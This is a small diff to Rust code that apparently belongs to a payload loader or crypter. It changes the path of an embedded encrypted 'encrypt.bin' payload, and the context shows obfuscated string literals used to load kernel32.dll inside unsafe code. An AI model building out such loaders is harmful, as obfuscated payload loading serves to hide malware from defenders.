@@ -3,7 +3,7 @@ use rustcrypt_ct_macros::obf_lit_bytes;
 use std::ptr;
 
 pub fn load_payload() -> Result<Vec<u8>, String> {
-    const ENCRYPT_DATA: &'static [u8] = include_bytes!("../encrypt.bin");
+    const ENCRYPT_DATA: &'static [u8] = include_bytes!("../../output/encrypt.bin");
     
     unsafe {
         let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
